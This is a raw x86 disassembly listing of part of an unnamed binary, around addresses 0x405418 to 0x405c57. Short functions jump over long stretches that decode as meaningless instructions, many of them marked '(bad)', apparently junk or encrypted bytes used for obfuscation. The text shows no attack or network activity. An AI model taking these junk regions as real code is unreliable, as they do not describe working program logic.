  405418:	cmp    DWORD PTR ds:0x44d424,0x0
  40541f:	je     0x405452
  405425:	cmp    DWORD PTR ds:0x44d424,0x21
  40542c:	jne    0x405442
  405432:	push   0x4107d0
  405437:	push   0x400000
  40543c:	call   DWORD PTR ds:0x4420dc
  405442:	mov    eax,ds:0x44d424
  405447:	dec    eax
  405448:	mov    ds:0x44d424,eax
  40544d:	jmp    0x405418
  405452:	mov    eax,DWORD PTR [ebp+0x14]
  405455:	mov    esi,DWORD PTR [ebp+0x10]
  405458:	mov    DWORD PTR [esi+0x8],eax
  40545b:	mov    eax,DWORD PTR [ebp+0x18]
  40545e:	mov    esi,DWORD PTR [ebp+0x10]
  405461:	mov    DWORD PTR [esi+0xc],eax
  405464:	mov    eax,DWORD PTR [ebp+0x1c]
  405467:	mov    esi,DWORD PTR [ebp+0x10]
  40546a:	mov    DWORD PTR [esi+0x10],eax
  40546d:	mov    eax,eax
  40546f:	mov    eax,DWORD PTR [ebp+0x8]
  405472:	xor    eax,ecx
  405474:	add    eax,edx
  405476:	pop    esi
  405477:	leave  
  405478:	ret    0x18
  40547b:	push   ebp
  40547c:	mov    ebp,esp
  40547e:	mov    eax,DWORD PTR [ebp+0xc]
  405481:	xor    edx,edx
  405483:	mov    ecx,0x7264fcad
  405488:	jmp    0x40559b
  40548d:	enter  0x8006,0xb
  405491:	inc    edx
  405492:	lea    ebx,[ebx-0x27]
  405495:	mov    dl,0x23
  405497:	sub    dh,BYTE PTR [eax]
  405499:	xchg   ebx,eax
  40549a:	out    0xcd,eax
  40549c:	cvtpi2ps xmm5,QWORD PTR [ebx]
  40549f:	jl     0x40551d
  4054a1:	bound  edi,QWORD PTR [esp+edi*2+0x7c]
  4054a5:	fstp   DWORD PTR [edi-0x78]
  4054a8:	cmp    DWORD PTR [eax+0x66],ebx
  4054ab:	push   esp
  4054ac:	ss nop
  4054ae:	pop    ebx
  4054af:	out    dx,eax
  4054b0:	mov    ds:0x9ae94999,eax
  4054b5:	pusha  
  4054b6:	dec    ecx
  4054b7:	(bad)  
  4054b8:	call   0x154431a9
  4054bd:	sub    DWORD PTR [ebx],ecx
  4054bf:	pop    ss
  4054c0:	rol    bl,0xa9
  4054c3:	stos   BYTE PTR es:[edi],al
  4054c4:	mov    ebx,0x240353b3
  4054c9:	cmp    ch,BYTE PTR [edx+0x719369b3]
  4054cf:	stc    
  4054d0:	xlat   BYTE PTR ds:[ebx]
  4054d1:	jno    0x40551e
  4054d3:	imul   esi,DWORD PTR [esi-0x35],0xffffffd8
  4054d7:	sub    cl,BYTE PTR [esi-0x28393657]
  4054dd:	std    
  4054de:	adc    ah,dl
  4054e0:	in     al,0x21
  4054e2:	xor    eax,0x5c5cf837
  4054e7:	hlt    
  4054e8:	or     BYTE PTR cs:[edx-0x6d282232],al
  4054ef:	push   es
  4054f0:	jge    0x4054a2
  4054f2:	dec    ebx
  4054f3:	cmc    
  4054f4:	rcl    ebp,cl
  4054f6:	rcl    DWORD PTR [esp+edi*8+0x4b401bf],1
  4054fd:	jle    0x40551d
  4054ff:	pop    ss
  405500:	adc    DWORD PTR ss:[ecx-0x66],edx
  405504:	cmp    DWORD PTR [ecx+0x60],edi
  405507:	adc    DWORD PTR [ecx],0x23
  40550a:	ins    DWORD PTR es:[edi],dx
  40550b:	or     eax,0x77574288
  405510:	(bad)  
  405511:	and    BYTE PTR [esi+0x131b471],ah
  405517:	les    edx,FWORD PTR [ebx]
  405519:	repnz pop edi
  40551b:	mov    bl,0x65
  40551d:	lock dec ecx
  40551f:	nop
  405520:	stos   BYTE PTR es:[edi],al
  405521:	jo     0x4054e8
  405523:	pop    eax
  405524:	xor    eax,esi
  405526:	xchg   BYTE PTR [edx+0x6a7c97f6],dl
  40552c:	inc    ebp
  40552d:	and    ebx,DWORD PTR [edx-0x4c]
  405530:	and    al,dh
  405532:	aam    0xb5
  405534:	or     DWORD PTR [ebx],eax
  405536:	cmp    BYTE PTR [edx-0x66a34683],bl
  40553c:	out    dx,al
  40553d:	jge    0x405552
  40553f:	mov    al,cl
  405541:	movsx  edx,ch
  405544:	or     BYTE PTR [edx-0x1007dc53],dl
  40554a:	mov    esp,0xaa6db7bf
  40554f:	(bad)  
  405550:	fdivr  DWORD PTR [ebp+0x7c]
  405553:	mov    ds:0x54b3fb99,al
  405558:	repz clc 
  40555a:	stos   BYTE PTR es:[edi],al
  40555b:	lods   al,BYTE PTR ds:[esi]
  40555c:	add    BYTE PTR [edi],0x5b
  40555f:	jae    0x405584
  405561:	jmp    ebx
  405563:	mov    ch,0xa6
  405565:	or     DWORD PTR [edx],edx
  405567:	loopne 0x4054ef
  405569:	jb     0x4055dd
  40556b:	inc    esp
  40556c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40556d:	push   eax
  40556e:	and    BYTE PTR [esi],bl
  405570:	or     dh,BYTE PTR [esi]
  405572:	sbb    BYTE PTR [esi+0x43486698],dh
  405578:	jne    0x4055d8
  40557a:	lock pop edx
  40557c:	shr    DWORD PTR [ebp-0x15e28687],1
  405582:	test   edx,ecx
  405584:	psraw  mm7,QWORD PTR [ecx]
  405587:	daa    
  405588:	jecxz  0x40550a
  40558a:	int    0x71
  40558c:	call   0x24f93c37
  405591:	out    dx,al
  405592:	jge    0x405548
  405594:	lea    edx,[edx]
  405596:	sub    al,BYTE PTR [ecx]
  405598:	mov    ebp,DWORD PTR [eax]
  40559a:	out    dx,eax
  40559b:	div    ecx
  40559d:	mov    ecx,DWORD PTR [ebp+0x10]
  4055a0:	and    ecx,eax
  4055a2:	or     ecx,0x81161d8f
  4055a8:	mov    eax,ecx
  4055aa:	pop    ebp
  4055ab:	ret    0x18
  4055ae:	push   ebp
  4055af:	mov    ebp,esp
  4055b1:	push   ecx
  4055b2:	xor    edx,edx
  4055b4:	xor    edx,DWORD PTR ds:0x4444d4
  4055ba:	xor    ecx,ecx
  4055bc:	or     ecx,DWORD PTR ds:0x44a700
  4055c2:	sub    edx,ecx
  4055c4:	sub    edx,DWORD PTR [edx+ecx*1]
  4055c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4055ce:	movzx  eax,WORD PTR ds:0x44d424
  4055d5:	adc    DWORD PTR ds:0x424726,eax
  4055db:	jmp    0x405714
  4055e0:	ins    DWORD PTR es:[edi],dx
  4055e1:	je     0x40559f
  4055e3:	xchg   DWORD PTR [ebp+0x47],edx
  4055e6:	jge    0x4055e2
  4055e8:	fs pop ebp
  4055ea:	mov    eax,0xb47ba377
  4055ef:	call   0x7cbc8004
  4055f4:	sbb    BYTE PTR [edi+0x7c],bh
  4055f7:	jl     0x405651
  4055f9:	lock in al,0x8
  4055fc:	es jecxz 0x4055ab
  4055ff:	std    
  405600:	mov    DWORD PTR [eax-0x2f2d80cf],esi
  405606:	ret    
  405607:	mov    cl,0x18
  405609:	sti    
  40560a:	sahf   
  40560b:	push   eax
  40560c:	xchg   DWORD PTR [ebx+0x23],edi
  40560f:	push   ebx
  405610:	jecxz  0x4055e3
  405612:	data16 jne 0x40559c
  405615:	fstp   TBYTE PTR [ecx]
  405617:	adc    BYTE PTR [eax+0x2aca71e1],0x5c
  40561e:	mov    ds:0x3fecedf,eax
  405623:	sub    BYTE PTR [esi-0x35],dh
  405626:	push   edx
  405627:	std    
  405628:	cmp    esi,DWORD PTR [eax]
  40562a:	ss xchg edi,eax
  40562c:	(bad)  [ebx+edx*4+0x41518d5]
  405633:	out    dx,eax
  405634:	xchg   esp,eax
  405635:	pop    es
  405636:	xor    DWORD PTR [eax+eax*2+0x5ee5b0ff],edi
  40563d:	cmp    DWORD PTR [esi+ecx*2],edx
  405640:	addr16 icebp 
  405642:	and    al,0xad
  405644:	(bad)  
  405645:	xchg   BYTE PTR [ecx+0x790099d7],bh
  40564b:	sub    ah,bl
  40564d:	xor    ecx,DWORD PTR [ebx+edx*2+0x5b]
  405651:	lds    esp,FWORD PTR [edi+ebx*1+0xdc92274]
  405658:	mov    ss,ebx
  40565a:	out    0x0,eax
  40565c:	arpl   WORD PTR [esi+edi*4+0x617bf18f],di
  405663:	sub    dl,BYTE PTR [ebp-0xd]
  405666:	ja     0x4056dd
  405668:	hlt    
  405669:	cmp    BYTE PTR [edx-0x34ae9d39],bh
  40566f:	sahf   
  405670:	sti    
  405671:	jp     0x405646
  405673:	and    dh,BYTE PTR [ecx-0x661ad83c]
  405679:	das    
  40567a:	dec    ebx
  40567b:	sbb    eax,ecx
  40567d:	mov    edi,DWORD PTR [ebx+eiz*4-0xa3e116a]
  405684:	test   DWORD PTR [ebx-0x58],eax
  405687:	xor    eax,0x1e0107a7
  40568c:	pop    esp
  40568d:	sbb    cl,dh
  40568f:	push   esi
  405690:	add    DWORD PTR [ecx],eax
  405692:	mov    cl,0xa2
  405694:	(bad)  
  405696:	call   0x565d:0xe79e7351
  40569d:	push   ebp
  40569e:	xchg   ebx,eax
  40569f:	adc    DWORD PTR [esp+ebp*8],ebp
  4056a2:	je     0x405690
  4056a4:	jmp    0x4056c3
  4056a6:	test   bl,bl
  4056a8:	sbb    al,0x4e
  4056aa:	hlt    
  4056ab:	cwde   
  4056ac:	ds mov al,0xfb
  4056af:	jmp    0xc47719e6
  4056b4:	std    
  4056b5:	pop    es
  4056b6:	mov    ds:0xe3f3e74d,eax
  4056bb:	jns    0x40570c
  4056bd:	nop
  4056be:	ds scas eax,DWORD PTR es:[edi]
  4056c0:	imul   esp,DWORD PTR [ecx-0x5c0e5fe6],0xa2cd2e4a
  4056ca:	outs   dx,BYTE PTR ds:[esi]
  4056cb:	lods   eax,DWORD PTR ds:[esi]
  4056cc:	sub    esi,eax
  4056ce:	popa   
  4056cf:	adc    bh,BYTE PTR [eax-0x18b69a09]
  4056d5:	in     al,dx
  4056d6:	mov    ch,0x94
  4056d8:	push   ecx
  4056d9:	sub    cl,al
  4056db:	push   ecx
  4056dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056dd:	ds leave 
  4056df:	jmp    0x4056ec
  4056e1:	aas    
  4056e2:	(bad)  [edi+0x372741c1]
  4056e8:	mov    ebx,0x816492a0
  4056ed:	clc    
  4056ee:	and    eax,0x68ab3c4f
  4056f3:	pop    ebp
  4056f4:	sub    eax,DWORD PTR [ebp-0x1c428866]
  4056fa:	and    al,BYTE PTR [ecx-0x53]
  4056fd:	xchg   esi,eax
  4056fe:	or     eax,0xe3a6bea4
  405703:	add    eax,0xd844ce6c
  405708:	adc    ch,BYTE PTR [ebx]
  40570a:	xchg   esi,eax
  40570b:	sub    al,0x41
  40570d:	lods   al,BYTE PTR ds:[esi]
  40570e:	out    0xf2,eax
  405710:	pop    es
  405711:	adc    bl,BYTE PTR [ecx+0x73]
  405714:	mov    eax,DWORD PTR [ebp-0x4]
  405717:	mov    edx,DWORD PTR [ebp+0x10]
  40571a:	or     ecx,0x2821
  405720:	mov    ecx,0x7510857
  405725:	not    DWORD PTR ds:0x424742
  40572b:	jmp    0x405864
  405730:	xor    al,dh
  405732:	push   0x65
  405734:	jp     0x40579b
  405736:	fnstsw WORD PTR [ecx-0x7c]
  405739:	mov    ebp,0x753f0b79
  40573e:	cmp    ah,ch
  405740:	cmp    al,0x2d
  405742:	jl     0x4057c0
  405744:	sbb    BYTE PTR [edi+0x7c],bh
  405747:	jl     0x4057c0
  405749:	mov    ah,0xb9
  40574b:	sbb    ah,ch
  40574d:	dec    esi
  40574e:	repz xchg ebx,eax
  405750:	retf   
  405751:	push   ds
  405752:	test   eax,0xbfe8e6e1
  405757:	in     al,0x49
  405759:	arpl   WORD PTR [eax-0x5c],bx
  40575c:	imul   ebx,DWORD PTR fs:[ecx-0x256477ac],0xf5037961
  405767:	cwde   
  405768:	rcl    DWORD PTR [eax-0x7e],cl
  40576b:	lea    ebx,[edx-0xa]
  40576e:	mov    bh,0xfd
  405770:	dec    esp
  405771:	push   edx
  405772:	ins    DWORD PTR es:[edi],dx
  405773:	pop    ds
  405774:	fadd   st(2),st
  405776:	inc    edi
  405777:	outs   dx,DWORD PTR ds:[esi]
  405778:	(bad)  
  405779:	sbb    ecx,ecx
  40577b:	outs   dx,DWORD PTR ds:[esi]
  40577c:	pop    edi
  40577d:	or     al,0xe0
  40577f:	mov    cl,0x58
  405781:	push   ebp
  405782:	rol    DWORD PTR [esi],0xc0
  405785:	mov    ecx,0x68a1685c
  40578a:	add    al,0xf3
  40578c:	mov    bh,0x60
  40578e:	ins    BYTE PTR es:[edi],dx
  40578f:	mov    ecx,0x882b336d
  405794:	mov    ch,0xf3
  405796:	pushf  
  405797:	push   esi
  405798:	cwde   
  405799:	mov    ecx,0x6f47020e
  40579e:	dec    ebp
  40579f:	dec    ebp
  4057a0:	or     BYTE PTR [ecx],0xfe
  4057a3:	push   ebx
  4057a4:	repnz cmp esi,edi
  4057a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057a8:	retf   
  4057a9:	mov    esp,0x23c37b6e
  4057ae:	jecxz  0x40580e
  4057b0:	jmp    0xed51da1d
  4057b5:	in     eax,0xc7
  4057b7:	inc    edi
  4057b8:	xchg   ebp,eax
  4057b9:	aad    0x71
  4057bb:	imul   edx,DWORD PTR [eax],0xe4a28b70
  4057c1:	pop    ecx
  4057c2:	xor    eax,0xb5d2bb22
  4057c7:	addr16 push ebx
  4057c9:	in     eax,dx
  4057ca:	jge    0x4057dc
  4057cc:	(bad)  
  4057ce:	imul   ecx,DWORD PTR [ebx-0x20],0x30e35c40
  4057d5:	dec    esp
  4057d6:	push   edx
  4057d7:	int3   
  4057d8:	fcomp  DWORD PTR [ecx-0x679490c2]
  4057de:	lahf   
  4057df:	mov    dh,0x67
  4057e1:	imul   ecx,DWORD PTR [ecx],0x61efdf1f
  4057e7:	out    0x5f,al
  4057e9:	xchg   edi,eax
  4057ea:	jbe    0x4057ad
  4057ec:	push   esp
  4057ed:	mov    ebp,0xdc525925
  4057f2:	sbb    BYTE PTR [edi+0x306bada2],ah
  4057f8:	pop    ss
  4057f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057fa:	adc    edi,edx
  4057fc:	aad    0x8e
  4057fe:	xchg   BYTE PTR [ebp+0x3e],dl
  405801:	xchg   esp,eax
  405802:	jno    0x405859
  405804:	mov    eax,ds:0x6b72750c
  405809:	(bad)  
  40580a:	out    dx,al
  40580b:	xchg   DWORD PTR [esi-0x622a9c17],edx
  405811:	aaa    
  405812:	(bad)  
  405813:	aad    0x8
  405815:	aas    
  405816:	rcl    DWORD PTR [ebp-0x66f48d62],cl
  40581c:	dec    ecx
  40581d:	mov    ebp,0xe894de45
  405822:	fisttp WORD PTR [edi+0x4e]
  405825:	fbstp  TBYTE PTR [ebx-0x7]
  405828:	cmp    bl,al
  40582a:	jmp    0x93943c20
  40582f:	xchg   edi,eax
  405830:	out    0xc0,al
  405832:	call   0x34f5f09c
  405837:	pop    edi
  405838:	ror    ecx,0x4
  40583b:	pop    eax
  40583c:	hlt    
  40583d:	fsub   st(0),st
  40583f:	scas   eax,DWORD PTR es:[edi]
  405840:	cmp    BYTE PTR [ecx+0x14],cl
  405843:	std    
  405844:	sbb    BYTE PTR [ebp+0x1e],ah
  405847:	jb     0x40582e
  405849:	scas   al,BYTE PTR es:[edi]
  40584a:	sub    esi,DWORD PTR [edi-0x6a]
  40584d:	mov    fs,WORD PTR [ecx]
  40584f:	fidiv  WORD PTR [eax]
  405851:	xor    bl,BYTE PTR ds:0xf5519f32
  405857:	sbb    al,0xac
  405859:	pushf  
  40585a:	pop    ebx
  40585b:	adc    bh,BYTE PTR [edx-0x68]
  40585e:	int3   
  40585f:	out    0xf4,al
  405861:	cdq    
  405862:	jmp    0x729e:0x5c13354
  405869:	xor    al,BYTE PTR [eax]
  40586b:	or     DWORD PTR ds:0x42473a,0x447984
  405875:	mov    DWORD PTR [edx],eax
  405877:	neg    edx
  405879:	mov    eax,DWORD PTR [ebp+0x14]
  40587c:	and    DWORD PTR ds:0x447994,0x0
  405886:	xor    edx,edx
  405888:	add    edx,DWORD PTR ds:0x447994
  40588e:	inc    edx
  40588f:	mov    DWORD PTR ds:0x447994,edx
  405895:	cmp    DWORD PTR ds:0x447994,0x14
  40589c:	jne    0x4058b0
  4058a2:	push   DWORD PTR [ebp-0x28]
  4058a5:	push   0x4479a4
  4058aa:	call   DWORD PTR ds:0x442360
  4058b0:	cmp    DWORD PTR ds:0x447994,0x13
  4058b7:	jb     0x405886
  4058bd:	mov    edx,DWORD PTR [ebp+0x10]
  4058c0:	mov    DWORD PTR [edx+0x4],eax
  4058c3:	mov    eax,DWORD PTR [ebp+0x18]
  4058c6:	mov    edx,DWORD PTR [ebp+0x10]
  4058c9:	mov    DWORD PTR [edx+0x8],eax
  4058cc:	mov    eax,DWORD PTR [ebp+0x1c]
  4058cf:	mov    edx,DWORD PTR [ebp+0x10]
  4058d2:	jmp    0x405a0b
  4058d7:	in     eax,0xab
  4058d9:	ins    DWORD PTR es:[edi],dx
  4058da:	push   es
  4058db:	jge    0x4058a3
  4058dd:	imul   edi,DWORD PTR gs:[ecx],0x49
  4058e1:	mov    al,ds:0x1c28c1b9
  4058e6:	and    al,0xd8
  4058e8:	sub    al,0x7c
  4058ea:	jl     0x405904
  4058ec:	jg     0x40596a
  4058ee:	jl     0x40590b
  4058f0:	inc    ecx
  4058f1:	dec    edi
  4058f2:	xor    edx,0xaae3de30
  4058f8:	(bad)  
  4058f9:	int3   
  4058fa:	lahf   
  4058fb:	mov    DWORD PTR [ecx-0x5d7585b1],ebx
  405901:	jle    0x4058e8
  405903:	mov    ah,0xf4
  405905:	mov    ch,0x83
  405907:	scas   eax,DWORD PTR es:[edi]
  405908:	fstp   DWORD PTR [esi+0x29e91b97]
  40590e:	ins    BYTE PTR es:[edi],dx
  40590f:	popa   
  405910:	or     DWORD PTR [esi-0x7f],0x317b9043
  405917:	mov    al,0x85
  405919:	jg     0x405999
  40591b:	inc    esi
  40591c:	pop    ecx
  40591d:	push   esp
  40591e:	(bad)  
  405920:	sbb    eax,0x208d507f
  405925:	push   ebp
  405926:	daa    
  405927:	or     bh,BYTE PTR [ebp+0x12]
  40592a:	or     eax,0xc8a86d6b
  40592f:	mov    al,ds:0xcd4d30d5
  405934:	xchg   esi,eax
  405935:	fiadd  WORD PTR [eax]
  405937:	push   ebx
  405938:	fbstp  TBYTE PTR [eax-0x54]
  40593b:	retf   
  40593c:	push   ecx
  40593d:	xor    eax,0x33bb3bde
  405942:	sub    dh,BYTE PTR [edx-0x38]
  405945:	inc    edi
  405946:	dec    eax
  405947:	mov    bx,0xacc1
  40594b:	out    0xa2,eax
  40594d:	fsub   DWORD PTR [ebx+0x36]
  405950:	dec    esp
  405951:	mov    al,ds:0xc3531c03
  405956:	xor    bh,BYTE PTR [edi-0x19f37bdc]
  40595c:	add    bl,dh
  40595e:	mov    ss,WORD PTR [eax+0x3f]
  405961:	xchg   esp,eax
  405962:	(bad)  
  405963:	retf   
  405964:	mov    dl,0x18
  405966:	push   edi
  405967:	mov    WORD PTR [ebx+0x41],es
  40596a:	shr    DWORD PTR [ebx],cl
  40596c:	jae    0x4059bf
  40596e:	cmp    eax,0xccfbe7bb
  405973:	jae    0x40594a
  405975:	xchg   ebp,eax
  405976:	test   DWORD PTR [ecx+ebp*1-0x6c79e382],esp
  40597d:	mov    dl,BYTE PTR [ecx+eax*1]
  405980:	cmp    esp,DWORD PTR [ebp-0x6abf23ba]
  405986:	inc    esi
  405987:	push   esi
  405988:	inc    ebx
  405989:	jo     0x4059fb
  40598b:	das    
  40598c:	dec    ebp
  40598d:	ret    0x1d23
  405990:	(bad)  
  405991:	jno    0x4059bc
  405993:	jnp    0x4059f5
  405995:	push   ss
  405996:	xor    al,0xe2
  405998:	shl    DWORD PTR [eax+0x1a84f2ab],cl
  40599e:	and    eax,0xe44c6d34
  4059a3:	icebp  
  4059a4:	es pop ebp
  4059a6:	xor    BYTE PTR [eax],bl
  4059a8:	xor    dl,0xcf
  4059ab:	loopne 0x405a2b
  4059ad:	xor    al,0x87
  4059af:	fs xchg ebp,eax
  4059b1:	inc    ebp
  4059b2:	jecxz  0x405a25
  4059b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059b5:	dec    esi
  4059b6:	dec    ecx
  4059b7:	dec    eax
  4059b8:	jmp    0x4059b0
  4059ba:	in     eax,dx
  4059bb:	addr16 popf 
  4059bd:	in     al,0x34
  4059bf:	push   es
  4059c0:	pop    ds
  4059c1:	jne    0x4059fc
  4059c3:	(bad)  [edi-0xd3600b8]
  4059c9:	or     ebp,ebp
  4059cb:	sub    eax,0x4031059f
  4059d0:	sbb    DWORD PTR [esi-0x26],edi
  4059d3:	test   al,0x12
  4059d5:	jp     0x4059ac
  4059d7:	xor    cl,al
  4059d9:	xor    bl,BYTE PTR [ebx]
  4059db:	sbb    al,0xe5
  4059dd:	sbb    bl,dh
  4059df:	push   0x77fc3cc
  4059e4:	xchg   ebp,eax
  4059e5:	jbe    0x4059d0
  4059e7:	xchg   ecx,eax
  4059e8:	push   cs
  4059e9:	in     al,dx
  4059ea:	xchg   esp,eax
  4059eb:	(bad)  
  4059ec:	rcr    BYTE PTR [ebp-0x48],0x72
  4059f0:	push   esp
  4059f1:	cs push 0xffffff97
  4059f4:	fwait
  4059f5:	les    ebx,FWORD PTR [ebx+eax*4+0xf072732]
  4059fc:	xor    bh,bl
  4059fe:	dec    edx
  4059ff:	lock mov BYTE PTR [eax+0x5fd41054],dh
  405a06:	clc    
  405a07:	xchg   esi,eax
  405a08:	retf   
  405a09:	xchg   BYTE PTR [esi-0x74f3bd77],bh
  405a0f:	inc    ebp
  405a10:	and    BYTE PTR [ebx+0x42891055],cl
  405a16:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405a1c:	test   eax,eax
  405a1e:	jmp    0x405b57
  405a23:	pop    edx
  405a24:	loope  0x405a4a
  405a26:	sbb    bh,BYTE PTR [ebx+0x5f617add]
  405a2c:	retf   
  405a2d:	mov    cl,0x6b
  405a2f:	cs sbb eax,0x2fe4e6e3
  405a35:	jl     0x405ab3
  405a37:	sbb    BYTE PTR [edi+0x7c],bh
  405a3a:	jl     0x405a0e
  405a3c:	pop    edx
  405a3d:	add    dl,BYTE PTR [esi+0x52]
  405a40:	ffreep st(5)
  405a42:	mov    eax,0x8bd68cb9
  405a47:	in     al,0x59
  405a49:	imul   ebx,esi,0xce06aaa8
  405a4f:	and    bl,BYTE PTR [ecx+edi*2]
  405a52:	sbb    BYTE PTR [edi],0xb1
  405a55:	pop    ss
  405a56:	push   cs
  405a57:	push   ebp
  405a58:	jge    0x4059dd
  405a5a:	es push ss
  405a5c:	nop
  405a5d:	xchg   BYTE PTR [esi+0xa],al
  405a60:	and    DWORD PTR [ebp+0x7a],eax
  405a63:	mov    edx,0x595e1f94
  405a69:	jmp    0x405a13
  405a6b:	test   DWORD PTR [ebx],0x8b0f069
  405a71:	in     eax,dx
  405a72:	popf   
  405a73:	(bad)  
  405a75:	dec    edx
  405a76:	xchg   esi,eax
  405a77:	ja     0x405ae1
  405a79:	push   edx
  405a7a:	cld    
  405a7b:	bound  edx,QWORD PTR [ebp-0x1c084635]
  405a81:	sahf   
  405a82:	dec    ecx
  405a83:	adc    al,0x9e
  405a85:	or     al,0x4
  405a87:	bswap  edi
  405a89:	cmp    edi,DWORD PTR [bx+si+0x55]
  405a8d:	and    eax,0x9f54a564
  405a92:	adc    eax,0x33aa289
  405a97:	(bad)  
  405a98:	inc    eax
  405a99:	(bad)  
  405a9a:	fistp  DWORD PTR [esi]
  405a9c:	pop    es
  405a9d:	test   al,0x1
  405a9f:	test   BYTE PTR [esi+esi*8-0x75],bl
  405aa3:	jmp    0x2cc86961
  405aa8:	mov    eax,0x8e5a3f13
  405aad:	push   0x3eb29fc8
  405ab2:	dec    esi
  405ab3:	into   
  405ab4:	jp     0x405a9e
  405ab6:	xor    eax,0x9bb95e91
  405abb:	lahf   
  405abc:	inc    edi
  405abd:	push   ss
  405abe:	push   cs
  405abf:	xor    edi,DWORD PTR [ebx]
  405ac1:	sti    
  405ac2:	in     al,0xb4
  405ac4:	scas   al,BYTE PTR es:[edi]
  405ac5:	cmp    dh,BYTE PTR [edx+0x4]
  405ac8:	cwde   
  405ac9:	pop    ds
  405aca:	fdiv   DWORD PTR [edx]
  405acc:	pop    edx
  405acd:	sbb    BYTE PTR [ecx],dl
  405acf:	dec    ebp
  405ad0:	jo     0x405a88
  405ad2:	or     DWORD PTR [esi+0x5f],ebx
  405ad5:	jg     0x405ac3
  405ad7:	cmp    BYTE PTR [esi-0x29],al
  405ada:	icebp  
  405adb:	mov    ds:0x651e95f6,al
  405ae0:	jmp    0x5ea47849
  405ae5:	push   edi
  405ae6:	mov    ecx,0x323eb765
  405aeb:	mov    ebp,0x7d3ece8f
  405af0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405af1:	imul   edx,DWORD PTR [edi+0xc],0xffffff95
  405af5:	(bad)
  405af8:	loope  0x405b5d
  405afa:	xor    eax,0x6d3ea72c
  405aff:	mov    bl,dl
  405b01:	int    0x7
  405b03:	xchg   ebp,eax
  405b04:	ror    DWORD PTR [edi],0x90
  405b07:	push   cs
  405b08:	jecxz  0x405ad9
  405b0a:	jae    0x405b12
  405b0c:	sub    eax,0x15a82ec7
  405b11:	call   0x4d3038ab
  405b16:	mov    bl,0x26
  405b18:	mov    bh,0xd1
  405b1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b1b:	mov    edi,0xf91b3205
  405b20:	jno    0x405b4b
  405b22:	aad    0xcb
  405b24:	push   eax
  405b25:	xchg   edx,eax
  405b26:	test   BYTE PTR [ecx],ch
  405b28:	inc    esp
  405b29:	fcom   DWORD PTR [edx]
  405b2b:	inc    eax
  405b2c:	inc    esp
  405b2d:	cmp    ecx,0x8
  405b30:	out    dx,eax
  405b31:	imul   edx,edx,0x31
  405b34:	(bad)  
  405b36:	fiadd  DWORD PTR [ecx-0x3a4021fd]
  405b3c:	cmp    eax,0xfd266fd4
  405b41:	outs   dx,BYTE PTR ds:[esi]
  405b42:	and    eax,0x82dbe35f
  405b47:	jge    0x405b4c
  405b49:	xor    eax,esi
  405b4b:	adc    eax,edi
  405b4d:	cld    
  405b4e:	lahf   
  405b4f:	xor    eax,0xa5b1768b
  405b54:	cmp    eax,0x458b6884
  405b59:	or     BYTE PTR [edi],cl
  405b5b:	test   DWORD PTR [ebx],eax
  405b5d:	add    BYTE PTR [eax],al
  405b5f:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  405b65:	add    eax,0x32729e
  405b6a:	leave  
  405b6b:	ret    0x1c
  405b6e:	push   ebp
  405b6f:	mov    ebp,esp
  405b71:	sub    esp,0x78
  405b74:	adc    DWORD PTR ds:0x447988,0x7d94
  405b7e:	jmp    0x405caa
  405b83:	or     esp,ebx
  405b85:	dec    ecx
  405b86:	or     BYTE PTR [ecx-0x53],ch
  405b89:	dec    ebp
  405b8a:	aad    0x48
  405b8c:	aas    
  405b8d:	adc    esi,esp
  405b8f:	in     eax,dx
  405b90:	ds ds push eax
  405b93:	sub    BYTE PTR [esi],0x7c
  405b96:	jl     0x405ba5
  405b98:	jg     0x405c16
  405b9a:	jl     0x405bc4
  405b9c:	in     al,0x42
  405b9e:	or     DWORD PTR [edx-0x26a6b82f],ecx
  405ba4:	fcomp  QWORD PTR [ebx-0x692a208e]
  405baa:	imul   ecx,DWORD PTR [ebx],0xf058b802
  405bb0:	xor    ebx,ebx
  405bb2:	inc    eax
  405bb3:	mov    ds:0x3514f7dd,al
  405bb8:	sbb    BYTE PTR [ebp-0x51],ah
  405bbb:	push   ecx
  405bbc:	mov    ds:0xab970846,eax
  405bc1:	sub    DWORD PTR [edi+0xe],0xfffffff7
  405bc5:	inc    edi
  405bc6:	shl    BYTE PTR [ebp-0x2738aa14],1
  405bcc:	add    BYTE PTR [edx+0x3ad3923e],0x38
  405bd3:	sub    DWORD PTR [ecx-0x1d480f44],edi
  405bd9:	sub    dl,BYTE PTR [ecx]
  405bdb:	mov    edx,0x3a55ebde
  405be0:	jp     0x405c2a
  405be2:	mov    esp,DWORD PTR [ecx+0x66e42415]
  405be8:	test   al,0xb2
  405bea:	xor    dl,BYTE PTR [eax]
  405bec:	inc    ebx
  405bed:	jg     0x405be9
  405bef:	inc    edx
  405bf0:	test   ebx,0xbaff3086
  405bf6:	inc    ebx
  405bf7:	push   0x887b601f
  405bfc:	psubq  mm3,QWORD PTR [ebp-0xcb5b364]
  405c03:	call   0x37d2:0xafaaaf37
  405c0a:	xchg   esp,eax
  405c0b:	mov    esp,0xe7a61e76
  405c10:	mov    eax,0x322f0084
  405c15:	dec    ebx
  405c16:	sub    al,0x54
  405c18:	lods   al,BYTE PTR ds:[esi]
  405c19:	sti    
  405c1a:	daa    
  405c1b:	fidiv  WORD PTR [eax]
  405c1d:	cld    
  405c1e:	dec    edx
  405c1f:	retf   
  405c20:	into   
  405c21:	out    0x50,al
  405c23:	xchg   ecx,eax
  405c24:	and    bh,ah
  405c26:	pop    ebx
  405c27:	dec    ebx
  405c28:	into   
  405c29:	cmp    DWORD PTR [esi],edx
  405c2b:	or     BYTE PTR [esi-0x55861d76],cl
  405c31:	mov    ch,0x83
  405c33:	sub    bl,BYTE PTR [edx-0x42]
  405c36:	push   esp
  405c37:	cmp    DWORD PTR [edx+0x8],esi
  405c3a:	add    edi,DWORD PTR [ebx+0x7d3dffca]
  405c40:	add    eax,0xdb2c9838
  405c45:	inc    ebx
  405c46:	ret    
  405c47:	mov    ebp,0xd1562e3c
  405c4c:	call   0x8f27:0x8ce40dc1
  405c53:	das    
  405c54:	fidivr WORD PTR [ebp+0x38]
  405c57:	nop
